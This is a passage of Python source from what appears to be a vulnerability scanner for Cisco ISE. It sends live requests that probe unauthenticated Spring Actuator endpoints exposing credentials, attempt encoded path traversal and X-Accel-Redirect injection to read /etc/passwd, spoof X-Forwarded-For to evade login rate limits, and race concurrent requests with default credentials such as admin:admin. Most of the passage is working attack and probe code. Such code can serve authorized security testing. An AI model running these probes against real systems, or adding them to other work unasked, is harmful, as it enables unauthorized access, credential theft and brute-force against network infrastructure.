        _st, _body, _hdrs = _get(_path)
        if _st is not None and _st < 400 and _body and len(_body) > 5:
            _txt = _body.decode(errors='replace')
            _has_data = any(
                _tok in _txt for _tok in
                ('SearchResult', 'resources', 'NetworkDevice', 'InternalUser', 'EndPoint')
            )
            findings.append({
                'severity': _sev if _has_data else 'MEDIUM',
                'title':    _title,
                'detail':   (
                    f'GET {_path} on {host}:{port} returned HTTP {_st} — '
                    f'{_desc}. Resource tokens present: {_has_data}. '
                    f'Preview: {_txt[:300]}'
                ),
                'host': host,
                'port': port,
            })

    _v1_paths = [
        ('/api/v1/',
         'MEDIUM', 'ISE_API_V1_ROOT_OPEN',
         '/api/v1/ root accessible — newest API generation; mixed auth enforcement '
         'vs ERS due to separate Spring MVC @RequestMapping controller class; '
         'switch-on-version dispatch in gateway may select incorrect auth handler'),
        ('/api/v1/config/deploymentinfo',
         'HIGH', 'ISE_API_V1_DEPLOYMENT_INFO',
         '/api/v1/config/deploymentinfo readable without auth — node roles, '
         'cluster topology, and patch level disclosed; aids targeted exploit selection'),
        ('/api/v1/info',
         'MEDIUM', 'ISE_API_V1_INFO_OPEN',
         '/api/v1/info accessible — version and feature set disclosure'),
        ('/api/v1/license/system/license-tier',
         'MEDIUM', 'ISE_API_V1_LICENSE_OPEN',
         'License tier at /api/v1/license/system/license-tier readable — '
         'confirms ISE feature set and aids capability mapping'),
    ]

    for _path, _sev, _title, _desc in _v1_paths:
        _st, _body, _hdrs = _get(_path)
        if _st is not None and _st < 400 and _body and len(_body) > 5:
            _txt = _body.decode(errors='replace')
            findings.append({
                'severity': _sev,
                'title':    _title,
                'detail':   (
                    f'GET {_path} on {host}:{port} returned HTTP {_st} — '
                    f'{_desc}. Preview: {_txt[:300]}'
                ),
                'host': host,
                'port': port,
            })

    _feature_paths = [
        ('/admin/features/',
         'MEDIUM', 'ISE_ADMIN_FEATURES_OPEN',
         '/admin/features/ accessible — feature flag state disclosure; '
         'temporary-field anti-pattern: nullable feature flags default to '
         'enabled during migration, exposing partially-implemented auth endpoints'),
        ('/admin/config/migration/',
         'MEDIUM', 'ISE_CONFIG_MIGRATION_OPEN',
         '/admin/config/migration/ reachable — migration-phase endpoint with '
         'historically weaker auth than production paths; dead-code survival '
         'across ISE major-version refactors'),
        ('/admin/config/migration/export/',
         'CRITICAL', 'ISE_CONFIG_MIGRATION_EXPORT',
         'Configuration migration export path accessible — may permit '
         'unauthenticated export of ISE policy via migration dead-code path '
         'not covered by current Spring Security filter chain'),
    ]

    for _path, _sev, _title, _desc in _feature_paths:
        _st, _body, _hdrs = _get(_path)
        if _st is not None and _st < 400:
            _txt = _body.decode(errors='replace') if _body else ''
            findings.append({
                'severity': _sev,
                'title':    _title,
                'detail':   (
                    f'GET {_path} on {host}:{port} returned HTTP {_st} — '
                    f'{_desc}. Preview: {_txt[:200]}'
                ),
                'host': host,
                'port': port,
            })

    return findings


def probe_ise_spring_framework_exposure(host: str, port: int = 443, timeout: float = 10.0) -> list:
    # Spring anti-pattern probe: actuator endpoints, Whitelabel errors, MVC path traversal, Security filter bypass
    findings: list = []
    _ctx = ssl.create_default_context()
    _ctx.check_hostname = False
    _ctx.verify_mode = ssl.CERT_NONE

    def _get(path: str, extra_hdrs: dict = None) -> tuple:
        _h = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64)',
            'Accept': 'application/json, text/html, */*',
        }
        if extra_hdrs:
            _h.update(extra_hdrs)
        try:
            _req = urllib.request.Request(f'https://{host}:{port}{path}', headers=_h)
            with urllib.request.urlopen(_req, context=_ctx, timeout=timeout) as _r:
                return _r.status, _r.read(8192), dict(_r.headers)
        except urllib.error.HTTPError as _e:
            _b = b''
            try:
                _b = _e.read(8192)
            except Exception:
                pass
            return _e.code, _b, {}
        except Exception:
            return None, b'', {}

    _actuator_roots = ['/actuator', '/api/actuator', '/rest/actuator', '/admin/actuator']
    _actuator_eps = [
        ('',             'HIGH',     'ISE_SPRING_ACTUATOR_ROOT',
         'Spring Actuator root accessible — lists all enabled management endpoints; '
         'god-class ActuatorEndpointHandlerMapping bundles mixed-sensitivity '
         'operations under a single controller with shared nullable auth state'),
        ('/env',         'CRITICAL', 'ISE_SPRING_ACTUATOR_ENV',
         'Spring Actuator /env exposed — full JVM environment including '
         'spring.datasource.password, RADIUS shared-secret properties, and LDAP '
         'bind credentials; management.security.enabled=false or missing '
         'endpoint.security config = open by default'),
        ('/beans',       'HIGH',     'ISE_SPRING_ACTUATOR_BEANS',
         'Spring Actuator /beans lists complete ApplicationContext bean graph — '
         'maps ISE internal class hierarchy for targeted deserialization gadget selection'),
        ('/mappings',    'HIGH',     'ISE_SPRING_ACTUATOR_MAPPINGS',
         'Spring Actuator /mappings discloses all @RequestMapping handler paths '
         'including internal admin endpoints not surfaced via UI'),
        ('/configprops', 'HIGH',     'ISE_SPRING_ACTUATOR_CONFIGPROPS',
         'Spring Actuator /configprops exposes @ConfigurationProperties bindings '
         'including DB URLs, credentials, and TLS keystore paths'),
        ('/health',      'MEDIUM',   'ISE_SPRING_ACTUATOR_HEALTH',
         'Spring Actuator /health accessible — DB connection status, disk space, '
         'and component liveness; leaks backend topology when show-details=ALWAYS'),
        ('/loggers',     'HIGH',     'ISE_SPRING_ACTUATOR_LOGGERS',
         'Spring Actuator /loggers readable and potentially writable — logger '
         'level enumeration; POST to raise DEBUG on auth classes extracts '
         'credential material from log aggregation'),
        ('/logfile',     'CRITICAL', 'ISE_SPRING_ACTUATOR_LOGFILE',
         'Spring Actuator /logfile — rolling application log tail; ISE auth logs '
         'contain RADIUS usernames, MAC addresses, and auth failure detail'),
    ]

    _seen: set = set()
    for _root in _actuator_roots:
        for _ep, _sev, _title, _desc in _actuator_eps:
            if _title in _seen:
                continue
            _path = f'{_root}{_ep}'
            _st, _body, _hdrs = _get(_path)
            if _st is not None and _st < 400 and _body and len(_body) > 10:
                _txt = _body.decode(errors='replace')
                findings.append({
                    'severity': _sev,
                    'title':    _title,
                    'detail':   (
                        f'GET {_path} on {host}:{port} returned HTTP {_st} — '
                        f'{_desc}. Preview: {_txt[:300]}'
                    ),
                    'host': host,
                    'port': port,
                })
                _seen.add(_title)

    _error_paths = [
        '/error', '/admin/error', '/ers/error', '/api/v1/error',
        '/notfound-probe-x7z',
    ]
    _whitelabel = [
        'There was an unexpected error',
        'Whitelabel Error Page',
        'This application has no explicit mapping for /error',
        'org.springframework',
        'javax.servlet',
    ]
    for _path in _error_paths:
        _st, _body, _hdrs = _get(_path)
        if _st is not None and _body:
            _txt = _body.decode(errors='replace')
            _hits = [_m for _m in _whitelabel if _m.lower() in _txt.lower()]
            if _hits:
                findings.append({
                    'severity': 'HIGH',
                    'title':    'ISE_SPRING_WHITELABEL_ERROR',
                    'detail':   (
                        f'GET {_path} on {host}:{port} returned HTTP {_st} with '
                        f'Spring Whitelabel error markers: {_hits} — discloses '
                        f'framework identity, stack trace fragments, and internal '
                        f'class names; long-method god-class error handler leaks '
                        f'request context into response body. Preview: {_txt[:300]}'
                    ),
                    'host': host,
                    'port': port,
                })
                break

    _traversal_paths = [
        ('/ers/config/networkdevice/..%2F..%2F..%2Fetc%2Fpasswd',
         'CRITICAL', 'ISE_SPRING_MVC_PATH_TRAVERSAL',
         'Spring MVC @PathVariable traversal via URL-encoded ../ on ERS resource ID — '
         'ISE ERS controller may not normalise path variables before filesystem '
         'lookup; switch-on-type resource dispatch may select unintended handler '
         'for crafted ID values'),
        ('/ers/config/networkdevice/%2F..%2F..%2Fetc%2Fpasswd',
         'CRITICAL', 'ISE_SPRING_MVC_PATH_TRAVERSAL_SLASH',
         'Spring MVC path traversal with leading encoded slash — alternative '
         'encoding to bypass prefix-based normalization in DispatcherServlet'),
    ]

    for _path, _sev, _title, _desc in _traversal_paths:
        if _title in _seen:
            continue
        _st, _body, _hdrs = _get(_path)
        if _st is not None and _st < 400 and _body:
            _txt = _body.decode(errors='replace')
            _lfi = any(_m in _txt for _m in ('root:x:', '/bin/bash', '/bin/sh', 'nobody:'))
            findings.append({
                'severity': 'CRITICAL' if _lfi else _sev,
                'title':    _title,
                'detail':   (
                    f'GET {_path} on {host}:{port} returned HTTP {_st} — '
                    f'{_desc}. LFI content confirmed: {_lfi}. '
                    f'Preview: {_txt[:300]}'
                ),
                'host': host,
                'port': port,
            })
            _seen.add(_title)

    _bypass_tests = [
        ('/ers/config/networkdevice/?_spring_security_remember_me=true',
         'HIGH', 'ISE_SPRING_SECURITY_PARAM_POLLUTION',
         'Spring Security remember-me parameter pollution on ERS endpoint — '
         '_spring_security_remember_me=true may bypass stateless session filter '
         'when RememberMeAuthenticationFilter is registered without explicit '
         'path restriction; nullable auth state defaults to open before '
         'principal is established'),
        ('/ers/config/networkdevice/?_csrf=&X-CSRF-TOKEN=',
         'MEDIUM', 'ISE_SPRING_CSRF_PARAM_BYPASS',
         'CSRF parameter pollution probe — empty X-CSRF-TOKEN; Spring Security '
         'CsrfFilter reads from request parameter when cookie CSRF not enforced'),
        ('/admin/login?error=&j_username=admin&j_password=&_spring_security_remember_me=on',
         'HIGH', 'ISE_SPRING_LOGIN_PARAM_BYPASS',
         'Spring Security UsernamePasswordAuthenticationFilter parameter '
         'pollution — empty password with remember-me flag; duplicate-auth-check '
         'anti-pattern creates two code paths with different null-handling '
         'for the password field'),
    ]

    for _path, _sev, _title, _desc in _bypass_tests:
        if _title in _seen:
            continue
        _st, _body, _hdrs = _get(_path)
        if _st is not None and _st < 400 and _body:
            _txt = _body.decode(errors='replace')
            _auth_hit = any(
                _m in _txt for _m in
                ('NetworkDeviceList', 'SearchResult', '"total"', 'networkdevice')
            )
            if _auth_hit:
                findings.append({
                    'severity': _sev,
                    'title':    _title,
                    'detail':   (
                        f'GET {_path} on {host}:{port} returned HTTP {_st} with '
                        f'authenticated-response markers — {_desc}. '
                        f'Preview: {_txt[:300]}'
                    ),
                    'host': host,
                    'port': port,
                })
                _seen.add(_title)

    return findings


def probe_ise_nginx_auth_bypass(host: str, port: int = 443, timeout: float = 10.0) -> list:
    # nginx auth_request subrequest direct-access, proxy_cache stale-auth, XFF rate-limit spoof
    findings: list = []
    import re as _re
    _ctx = ssl.create_default_context()
    _ctx.check_hostname = False
    _ctx.verify_mode = ssl.CERT_NONE

    def _get(path: str, extra_hdrs: dict = None) -> tuple:
        _h = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64)',
            'Accept': 'application/json, text/html, */*',
        }
        if extra_hdrs:
            _h.update(extra_hdrs)
        try:
            _req = urllib.request.Request(f'https://{host}:{port}{path}', headers=_h)
            with urllib.request.urlopen(_req, context=_ctx, timeout=timeout) as _r:
                return _r.status, _r.read(8192), dict(_r.headers)
        except urllib.error.HTTPError as _e:
            _b = b''
            try:
                _b = _e.read(8192)
            except Exception:
                pass
            return _e.code, _b, {}
        except Exception:
            return None, b'', {}

    # auth_request subrequest endpoints accessible directly — subrequest URL reachable = auth bypass
    _subreq_paths = [
        '/_check_auth', '/_auth', '/_validate', '/_auth_check',
        '/_auth_request', '/_authenticate', '/auth/check',
        '/internal/auth', '/_internal/auth', '/nginx_auth',
    ]
    for _path in _subreq_paths:
        _st, _body, _hdrs = _get(_path)
        if _st is not None and _st < 400:
            findings.append({
                'severity': 'CRITICAL',
                'title': 'ISE_NGINX_AUTH_SUBREQ_DIRECT',
                'detail': (
                    f'GET {_path} on {host}:{port} returned HTTP {_st} — '
                    f'nginx auth_request subrequest target directly accessible without '
                    f'proxied auth context; if this path is the configured auth_request '
                    f'validation URL the backend auth check is entirely bypassed for '
                    f'clients that reach the subrequest URL directly. '
                    f'Preview: {_body[:200].decode(errors="replace")}'
                ),
                'host': host,
                'port': port,
            })
            break

    # proxy_cache stale-auth: ISE API responses missing Cache-Control: private or no-store
    _api_paths = [
        '/ers/config/networkdevice',
        '/admin/API/mnt/AuthStatus/MACAddress',
        '/api/v1/policy/network-access/policy-set',
        '/admin/login',
    ]
    for _path in _api_paths:
        _st, _body, _hdrs = _get(_path)
        if _st is None:
            continue
        _cc = _hdrs.get('Cache-Control', _hdrs.get('cache-control', ''))
        _vary = _hdrs.get('Vary', _hdrs.get('vary', ''))
        _age = _hdrs.get('Age', _hdrs.get('age', ''))
        _xcache = _hdrs.get('X-Cache', _hdrs.get('x-cache', ''))
        _protected = any(_t in _cc.lower() for _t in ('private', 'no-store', 'no-cache')) if _cc else False
        if _st < 500 and not _protected:
            findings.append({
                'severity': 'HIGH',
                'title': 'ISE_NGINX_CACHE_NO_PRIVATE',
                'detail': (
                    f'GET {_path} on {host}:{port} returned HTTP {_st} with '
                    f'Cache-Control: "{_cc}" Vary: "{_vary}" — '
                    f'response lacks Cache-Control: private/no-store; '
                    f'nginx proxy_cache without Vary on Cookie or Authorization '
                    f'serves cached authenticated ISE API responses to unauthenticated '
                    f'clients on cache HIT. Age: {_age!r} X-Cache: {_xcache!r}.'
                ),
                'host': host,
                'port': port,
            })
            break

    # X-Accel-Redirect request-header passthrough: detect if nginx reflects injected internal redirect
    _accel_paths = ['/admin/', '/ers/config/networkdevice', '/api/v1/']
    for _path in _accel_paths:
        _st, _body, _hdrs = _get(_path, extra_hdrs={'X-Accel-Redirect': '/etc/passwd'})
        if _st is not None and _st < 400:
            _txt = _body.decode(errors='replace')
            if 'root:' in _txt or '/bin/bash' in _txt or '/bin/sh' in _txt:
                findings.append({
                    'severity': 'CRITICAL',
                    'title': 'ISE_NGINX_ACCEL_REDIRECT_INJECT',
                    'detail': (
                        f'GET {_path} with X-Accel-Redirect: /etc/passwd on {host}:{port} '
                        f'returned HTTP {_st} with filesystem content — '
                        f'nginx passed X-Accel-Redirect request header to ISE backend '
                        f'which reflected it as an upstream response header; nginx then '
                        f'performed internal redirect to the injected path, bypassing '
                        f'location internal directive access control. '
                        f'Preview: {_txt[:200]}'
                    ),
                    'host': host,
                    'port': port,
                })
                break

    # rate-limit bypass: limit_req_zone $binary_remote_addr bypassed via trusted X-Forwarded-For
    _rl_path = '/admin/login'
    _xff_ips = [f'203.0.113.{i}' for i in range(1, 6)]
    _no_limit = sum(
        1 for _xff in _xff_ips
        if _get(_rl_path, extra_hdrs={'X-Forwarded-For': _xff, 'X-Real-IP': _xff})[0] not in (None, 429, 503)
    )
    if _no_limit == len(_xff_ips):
        findings.append({
            'severity': 'MEDIUM',
            'title': 'ISE_NGINX_RATELIMIT_XFF_BYPASS',
            'detail': (
                f'Five sequential requests to {_rl_path} on {host}:{port} with distinct '
                f'X-Forwarded-For values all returned non-429/503 — '
                f'nginx limit_req_zone keyed on $binary_remote_addr bypassed when '
                f'set_real_ip_from trusts client-supplied X-Forwarded-For; '
                f'attacker rotates spoofed XFF to circumvent per-IP rate limiting '
                f'on the ISE admin login endpoint enabling unrestricted brute-force.'
            ),
            'host': host,
            'port': port,
        })

    return findings


def probe_ise_nginx_upstream_config(host: str, port: int = 443, timeout: float = 10.0) -> list:
    # nginx upstream health probe exposure, backend addr leak in 502/504, keepalive session state bleed
    findings: list = []
    import re as _re
    _ctx = ssl.create_default_context()
    _ctx.check_hostname = False
    _ctx.verify_mode = ssl.CERT_NONE

    def _get(path: str, extra_hdrs: dict = None) -> tuple:
        _h = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64)',
            'Accept': 'application/json, text/html, */*',
            'Connection': 'keep-alive',
        }
        if extra_hdrs:
            _h.update(extra_hdrs)
        try:
            _req = urllib.request.Request(f'https://{host}:{port}{path}', headers=_h)
            with urllib.request.urlopen(_req, context=_ctx, timeout=timeout) as _r:
                return _r.status, _r.read(8192), dict(_r.headers)
        except urllib.error.HTTPError as _e:
            _b = b''
            try:
                _b = _e.read(8192)
            except Exception:
                pass
            return _e.code, _b, {}
        except Exception:
            return None, b'', {}

    # upstream health probe endpoints — nginx upstream health_check directive often unauthenticated
    _health_probes = [
        ('/nginx_status',  'HIGH',   'ISE_NGINX_STUB_STATUS',
         'nginx stub_status endpoint — discloses active connections, accepts/handled/requests '
         'counters leaking upstream worker pool metrics; classic misconfigured health surface'),
        ('/health',        'MEDIUM', 'ISE_NGINX_HEALTH_EP',
         'nginx upstream /health probe accessible without auth — '
         'backend liveness and component status exposed'),
        ('/healthz',       'MEDIUM', 'ISE_NGINX_HEALTHZ_EP',
         'nginx upstream /healthz probe accessible without auth'),
        ('/ready',         'LOW',    'ISE_NGINX_READY_EP',
         'nginx upstream /ready probe accessible without auth — readiness gate exposed'),
        ('/readyz',        'LOW',    'ISE_NGINX_READYZ_EP',
         'nginx upstream /readyz probe accessible without auth'),
        ('/ping',          'LOW',    'ISE_NGINX_PING_EP',
         'nginx upstream /ping probe accessible — confirms liveness without auth'),
        ('/status',        'MEDIUM', 'ISE_NGINX_STATUS_EP',
         'nginx upstream /status endpoint accessible without auth'),
        ('/admin/health',  'HIGH',   'ISE_NGINX_ADMIN_HEALTH_EP',
         'ISE admin path /admin/health accessible without authentication'),
    ]
    _stub_markers = ('active connections', 'server accepts handled', 'reading:', 'writing:')
    _health_markers = ('ok', 'up', 'healthy', 'alive', 'status')
    _seen_health: set = set()
    for _path, _sev, _title, _desc in _health_probes:
        if _title in _seen_health:
            continue
        _st, _body, _hdrs = _get(_path)
        if _st is not None and _st < 400 and _body:
            _txt = _body.decode(errors='replace').lower()
            _hit = (
                any(_m in _txt for _m in _stub_markers) or
                any(_m in _txt for _m in _health_markers)
            )
            if _hit:
                findings.append({
                    'severity': _sev,
                    'title': _title,
                    'detail': (
                        f'GET {_path} on {host}:{port} returned HTTP {_st} — '
                        f'{_desc}. '
                        f'Preview: {_body[:200].decode(errors="replace")}'
                    ),
                    'host': host,
                    'port': port,
                })
                _seen_health.add(_title)

    # 502/504 error body backend address disclosure — nginx default error page leaks upstream IP:port
    _ip_re = _re.compile(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})[:\s](\d{4,5})')
    _trigger_paths = [
        '/ers/config/networkdevice/upstream-probe-x9q',
        '/admin/upstream-probe-x9q',
        '/api/v1/upstream-probe-x9q',
    ]
    for _path in _trigger_paths:
        _st, _body, _hdrs = _get(_path)
        if _st in (502, 504) and _body:
            _txt = _body.decode(errors='replace')
            _matches = _ip_re.findall(_txt)
            if _matches:
                findings.append({
                    'severity': 'HIGH',
                    'title': 'ISE_NGINX_UPSTREAM_ADDR_LEAK',
                    'detail': (
                        f'GET {_path} on {host}:{port} returned HTTP {_st} with '
                        f'upstream backend addresses in error body: {_matches[:5]} — '
                        f'nginx default 502/504 error page embeds upstream group '
                        f'IP:port from the failed proxy_pass target; reveals ISE '
                        f'backend topology enabling lateral movement targeting. '
                        f'Preview: {_txt[:300]}'
                    ),
                    'host': host,
                    'port': port,
                })
                break

    # keepalive session bleed: rapid unauthenticated requests detect inconsistent state on pooled connections
    _bleed_path = '/ers/config/networkdevice'
    _bleed_results = []
    for _i in range(4):
        _st, _body, _hdrs = _get(_bleed_path)
        _bleed_results.append((_st, len(_body)))
    _statuses = set(_r[0] for _r in _bleed_results if _r[0] is not None)
    _data_hits = [_r[1] for _r in _bleed_results if _r[0] is not None and _r[0] < 400 and _r[1] > 100]
    if _data_hits:
        findings.append({
            'severity': 'CRITICAL',
            'title': 'ISE_NGINX_KEEPALIVE_UNAUTH_DATA',
            'detail': (
                f'Unauthenticated GET {_bleed_path} on {host}:{port} returned '
                f'HTTP {list(_statuses)} with up to {max(_data_hits)} bytes of content — '
                f'nginx upstream keepalive connection reuse (proxy_http_version 1.1 + '
                f'Connection: "" clears per-request close token) may reuse TCP connections '
                f'carrying prior ISE session state; unauthenticated request lands on a '
                f'keepalive-pooled backend connection authenticated by a prior client.'
            ),
            'host': host,
            'port': port,
        })
    elif len(_statuses) > 1:
        findings.append({
            'severity': 'HIGH',
            'title': 'ISE_NGINX_KEEPALIVE_STATE_DRIFT',
            'detail': (
                f'Four sequential unauthenticated GET {_bleed_path} on {host}:{port} '
                f'returned inconsistent status codes {_statuses} — '
                f'nginx upstream keepalive pool serves requests across backend connections '
                f'with differing session state; ISE auth not bound to TCP connection '
                f'enables session state bleed between keepalive-reused connections.'
            ),
            'host': host,
            'port': port,
        })

    return findings


def probe_ise_concurrent_auth_race_surface(host: str, port: int = 443, timeout: float = 10.0) -> list:
    findings: list = []
    import threading
    import re as _re

    _ctx = ssl.create_default_context()
    _ctx.check_hostname = False
    _ctx.verify_mode = ssl.CERT_NONE

    _ers_path = '/ers/config/networkdevice'
    _legacy_path = '/admin/API/Network Device/deviceIPAddress'

    _creds_seq = [
        base64.b64encode(b'admin:admin').decode(),
        base64.b64encode(b'admin:invalid_x9q').decode(),
        base64.b64encode(b'no:auth').decode(),
        base64.b64encode(b'x:x').decode(),
        None,
    ]

    _results = [None] * len(_creds_seq)
    _lock = threading.Lock()

    def _req(idx: int, cred):
        _h = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64)',
            'Accept': 'application/json',
            'Content-Type': 'application/json',
        }
        if cred is not None:
            _h['Authorization'] = f'Basic {cred}'
        try:
            _rq = urllib.request.Request(
                f'https://{host}:{port}{_ers_path}', headers=_h
            )
            with urllib.request.urlopen(_rq, context=_ctx, timeout=timeout) as _r:
                _body = _r.read(4096)
                _hdrs = dict(_r.headers)
                with _lock:
                    _results[idx] = (_r.status, _body, _hdrs)
        except urllib.error.HTTPError as _e:
            _b = b''
            try:
                _b = _e.read(4096)
            except Exception:
                pass
            with _lock:
                _results[idx] = (_e.code, _b, dict(_e.headers) if hasattr(_e, 'headers') else {})
        except Exception:
            with _lock:
                _results[idx] = (None, b'', {})

    _threads = []
    for _i, _c in enumerate(_creds_seq):
        _t = threading.Thread(target=_req, args=(_i, _c))
        _threads.append(_t)
    for _t in _threads:
        _t.start()
    for _t in _threads:
        _t.join(timeout=timeout + 2)

    _unauth_data = []
    _token_in_error = []
    for _i, _r in enumerate(_results):
        if _r is None:
            continue
        _st, _body, _hdrs = _r
        _txt = _body.decode(errors='replace') if _body else ''
        if _st is not None and _st < 400 and len(_body) > 100 and _i >= 2:
            _unauth_data.append((_i, _st, len(_body), _txt[:300]))
        if _st is not None and _st >= 400:
            _tok = _hdrs.get('X-Auth-Token') or _hdrs.get('x-auth-token')
            if _tok:
                _token_in_error.append((_i, _st, _tok))

    if _unauth_data:
        for _idx, _st, _sz, _preview in _unauth_data:
            _cred_label = 'no-credential' if _creds_seq[_idx] is None else f'degraded-cred-{_idx}'
            findings.append({
                'severity': 'CRITICAL',
                'title': 'ISE_CONCURRENT_AUTH_RACE_UNAUTH_DATA',
                'detail': (
                    f'Concurrent fan-out to {_ers_path} on {host}:{port}: '
                    f'request slot {_idx} ({_cred_label}) returned HTTP {_st} '
                    f'with {_sz} bytes — simultaneous session-establishment window '
                    f'allowed unauthenticated or degraded-auth request to receive '
                    f'authenticated response body; TOCTOU window in ISE Spring auth '
                    f'filter chain. Preview: {_preview}'
                ),
                'host': host,
                'port': port,
            })

    if _token_in_error:
        for _idx, _st, _tok in _token_in_error:
            findings.append({
                'severity': 'HIGH',
                'title': 'ISE_AUTH_PARTIAL_TOKEN_ON_ERROR',
                'detail': (
                    f'Concurrent request slot {_idx} to {_ers_path} on {host}:{port} '
                    f'returned HTTP {_st} with X-Auth-Token header present in error '
                    f'response: {str(_tok)[:80]} — ISE auth filter emitted a partial '
                    f'session token during a failed authentication exchange; token '
                    f'may be replayable against subsequent requests within the '
                    f'keepalive session establishment window.'
                ),
                'host': host,
                'port': port,
            })

    _leg_st, _leg_body, _leg_hdrs = None, b'', {}
    _ers_st, _ers_body, _ers_hdrs = None, b'', {}
    _leg_result = [None]
    _ers_result = [None]

    def _legacy_req():
        _h = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64)',
            'Accept': 'application/json, text/html, */*',
        }
        try:
            _rq = urllib.request.Request(
                f'https://{host}:{port}{_legacy_path}', headers=_h
            )
            with urllib.request.urlopen(_rq, context=_ctx, timeout=timeout) as _r:
                _leg_result[0] = (_r.status, _r.read(4096), dict(_r.headers))
        except urllib.error.HTTPError as _e:
            _b = b''
            try:
                _b = _e.read(4096)
            except Exception:
                pass
            _leg_result[0] = (_e.code, _b, {})
        except Exception:
            _leg_result[0] = (None, b'', {})

    def _ers_req():
        _h = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64)',
            'Accept': 'application/json',
        }
        try:
            _rq = urllib.request.Request(
                f'https://{host}:{port}{_ers_path}', headers=_h
            )
            with urllib.request.urlopen(_rq, context=_ctx, timeout=timeout) as _r:
                _ers_result[0] = (_r.status, _r.read(4096), dict(_r.headers))
        except urllib.error.HTTPError as _e:
            _b = b''
            try:
                _b = _e.read(4096)
            except Exception:
                pass
            _ers_result[0] = (_e.code, _b, {})
        except Exception:
            _ers_result[0] = (None, b'', {})

    _tl = threading.Thread(target=_legacy_req)
    _te = threading.Thread(target=_ers_req)
    _tl.start()
    _te.start()
    _tl.join(timeout=timeout + 2)
    _te.join(timeout=timeout + 2)

    if _leg_result[0] and _ers_result[0]:
        _lst, _lbody, _lhdrs = _leg_result[0]
        _est, _ebody, _ehdrs = _ers_result[0]
        if (
            _lst is not None and _est is not None
            and _lst < 400 and _est >= 400
            and len(_lbody) > 100
        ):
            findings.append({
                'severity': 'CRITICAL',
                'title': 'ISE_LEGACY_API_AUTH_ENFORCEMENT_GAP',
                'detail': (
                    f'Simultaneous unauthenticated probe: legacy {_legacy_path} '
                    f'returned HTTP {_lst} ({len(_lbody)} bytes) while current '
                    f'{_ers_path} returned HTTP {_est} on {host}:{port} — '
                    f'legacy admin API endpoint has weaker or absent auth enforcement '
                    f'compared to ERS API path; auth_request filter chain may not '
                    f'cover the legacy path when an active ERS session exists. '
                    f'Preview: {_lbody[:200].decode(errors="replace")}'
                ),
                'host': host,
                'port': port,
            })
        elif _lst is not None and _lst < 400 and len(_lbody) > 100:
            findings.append({
                'severity': 'HIGH',
                'title': 'ISE_LEGACY_API_UNAUTH_ACCESSIBLE',
                'detail': (
                    f'Unauthenticated GET {_legacy_path} on {host}:{port} '
                    f'returned HTTP {_lst} with {len(_lbody)} bytes — '
                    f'legacy admin API path reachable without credentials; '
                    f'parallel ERS enforcement does not extend to legacy endpoint. '
                    f'Preview: {_lbody[:200].decode(errors="replace")}'
                ),
                'host': host,
                'port': port,
            })

    if not findings:
        findings.append({
            'severity': 'INFO',
            'title': 'ISE_CONCURRENT_AUTH_RACE_NO_WINDOW',
            'detail': (
                f'Five simultaneous requests to {_ers_path} and legacy '
                f'{_legacy_path} on {host}:{port} — no unauthenticated '
                f'data returned in concurrent window; no partial auth token '
                f'disclosed; legacy/current enforcement gap not detected.'
            ),
            'host': host,
            'port': port,
        })

    return findings


def probe_ise_typed_error_fingerprint(host: str, port: int = 443, timeout: float = 10.0) -> list:
    findings: list = []
    import re as _re

    _ctx = ssl.create_default_context()
    _ctx.check_hostname = False
    _ctx.verify_mode = ssl.CERT_NONE

    _endpoints = [
        ('/ers/config/networkdevice',                'application/json',  'ERS'),
        ('/ers/config/endpointgroup',                'application/json',  'ERS'),
        ('/api/v1/network-device',                   'application/json',  'OpenAPI'),
        ('/api/v1/policy/network-access/policy-set', 'application/json',  'OpenAPI'),
        ('/admin/API/mnt/AuthStatus/MACAddress/00:00:00:00:00:00/0/0/0', 'application/xml', 'MnT'),
        ('/admin/portalapi/swagger/index.html',      'text/html',         'Portal'),
        ('/ers/config/node',                         'application/json',  'ERS-Node'),
        ('/radius/token',                            'application/json',  'RADIUS'),
    ]

    _malformed_creds = [
        ('Authorization', 'Basic ' + base64.b64encode(b'\x00\x00:\x00\x00').decode()),
        ('Authorization', 'Bearer AAAA.BBBB.CCCC'),
        ('Authorization', 'Basic !!!invalid!!!'),
        ('X-CSRF-Token', 'deadbeef'),
    ]

    _java_exc_re = _re.compile(
        r'(java\.[a-zA-Z0-9.]+Exception|'
        r'org\.springframework\.[a-zA-Z0-9.]+|'
        r'com\.cisco\.ise\.[a-zA-Z0-9.]+|'
        r'at [a-zA-Z0-9.$_]+\.[a-zA-Z0-9$_]+\([^)]+\))',
        _re.IGNORECASE
    )
    _version_re = _re.compile(
        r'(ISE[\s\-_]?[23]\.[0-9]+(?:\.[0-9]+)*|'
        r'"version"\s*:\s*"[^"]{3,30}"|'
        r'cisco[\s\-]identity[\s\-]service[\s\-]engine[\s/\s][0-9.]+)',
        _re.IGNORECASE
    )
    _role_re = _re.compile(
        r'\b(Primary[\s_]Admin[\s_]Node|PAN|PSN|MnT|Secondary[\s_]Admin|'
        r'Monitoring[\s_]Node|Policy[\s_]Service[\s_]Node|'
        r'"nodeType"\s*:\s*"[^"]{2,30}")',
        _re.IGNORECASE
    )
    _internal_ip_re = _re.compile(
        r'\b(10\.\d{1,3}\.\d{1,3}\.\d{1,3}|'
        r'172\.(?:1[6-9]|2[0-9]|3[01])\.\d{1,3}\.\d{1,3}|'
        r'192\.168\.\d{1,3}\.\d{1,3})\b'
    )

    _ers_subsystem_map = {
        range(400, 401): 'ERS-BAD-REQUEST',
        range(401, 402): 'AUTH-REQUIRED',
        range(403, 404): 'ERS-FORBIDDEN',
        range(404, 405): 'ERS-NOT-FOUND',
        range(415, 416): 'ERS-MEDIA-TYPE',
        range(500, 600): 'ERS-SERVER-ERROR',
    }

    def _classify_subsystem(status: int, label: str) -> str:
        for _rng, _sub in _ers_subsystem_map.items():
            if status in _rng:
                return _sub
        return label

    def _fetch(path: str, accept: str, extra_hdrs: dict = None) -> tuple:
        _h = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64)',
            'Accept': accept,
        }
        if extra_hdrs:
            _h.update(extra_hdrs)
        try:
            _rq = urllib.request.Request(f'https://{host}:{port}{path}', headers=_h)
            with urllib.request.urlopen(_rq, context=_ctx, timeout=timeout) as _r:
                return _r.status, _r.read(8192), dict(_r.headers)
